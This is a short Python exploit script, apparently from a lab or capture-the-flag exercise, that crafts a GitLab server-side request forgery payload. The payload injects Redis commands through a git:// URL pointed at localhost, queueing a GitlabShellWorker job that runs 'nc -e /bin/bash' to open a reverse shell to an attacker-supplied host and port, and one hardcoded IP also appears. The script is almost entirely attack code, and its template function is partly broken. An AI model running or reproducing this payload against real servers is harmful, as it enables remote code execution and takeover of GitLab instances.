import urllib.parse
import sys

lhost = sys.argv[1]
lport = sys.argv[2]

radis_url = 'git://[0:0:0:0:0:ffff:127.0.0.1]:6379/'


def exploit_project_creation():
    rev_shell = "nc -e /bin/bash {} {}".format(lhost, lport)
    payload_template = """\n multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash 10.10.15.71 4141 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git"""
    payload = payload_template.replace("{payload}", rev_shell)
    url_enc = urllib.parse.quote(payload)
    return url_enc


#urllib encoding is not working
# print(f'{radis_url}' + exploit_project_creation())

encoded = f'git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A+multi%0D%0A+sadd+resque%3Agitlab%3Aqueues+system_hook_push' \
          f'%0D%0A+lpush+resque%3Agitlab%3Aqueue%3Asystem_hook_push+%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker' \
          f'%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%5C%27%7Cnc+-e+%2Fbin%2Fbash+' \
          f'{lhost}+{lport}%5C%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C' \
          f'%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C' \
          f'%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A+exec%0D%0A+exec%0D%0A' \
          f'%2Fssrf.git '

print(encoded)